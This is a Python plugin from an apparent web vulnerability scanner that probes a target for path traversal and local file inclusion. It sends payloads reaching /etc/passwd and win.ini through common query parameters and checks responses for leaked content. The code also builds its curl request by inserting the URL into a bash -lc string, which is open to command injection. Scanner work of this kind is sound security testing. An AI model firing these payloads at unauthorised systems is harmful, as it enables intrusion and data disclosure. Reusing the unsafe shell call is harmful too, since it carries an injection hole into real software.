# plugins/path_traversal_probe.py
from typing import Dict, Any, List
from utils import run_cmd, Timer
from urllib.parse import urljoin, quote_plus

PLUGIN_CONFIG_NAME = "path_traversal_probe"
PLUGIN_CONFIG_ALIASES = ["lfi_probe"]
UUID_055 = "uuid-055"  # (55)

PARAMS = ["file","path","page","include","template"]
PAYLOADS = ["../../../../etc/passwd","..\\..\\..\\..\\windows\\win.ini"]

def _get(url: str, timeout: int) -> str:
    return run_cmd(["bash","-lc", f'curl -sS -L -m {timeout} "{url}"'], timeout=timeout+2)

def run_plugin(target: str, ai_fn, cfg: Dict[str,Any]=None):
    """
    cfg: { "timeout": 12, "paths": ["/view?file="] }
    """
    cfg = cfg or {}
    timeout = int(cfg.get("timeout", 12))
    paths = cfg.get("paths") or ["/"]

    evid, hits = [], 0
    with Timer() as t:
        for p in paths:
            base = urljoin(target.rstrip("/") + "/", p.lstrip("/"))
            for param in PARAMS:
                for pay in PAYLOADS:
                    u = base + (("&" if "?" in base else "?") + f"{param}={quote_plus(pay)}")
                    body = _get(u, timeout).lower()
                    if "root:x:" in body or "[extensions]" in body:
                        hits += 1; evid.append(f"{p}?{param}= -> leak plausível ({pay})")

    sev = "high" if hits else "info"
    txt = "\n".join(f"- {e}" for e in evid) if evid else "Sem sinais de LFI/traversal"
    item = {"plugin_uuid":UUID_055,"scan_item_uuid":UUID_055,"result":txt,"analysis_ai":ai_fn("PathTraversalProbe",UUID_055,txt),"severity":sev,"duration":t.duration,"auto":True}
    return {"plugin":"PathTraversalProbe","result":[item]}
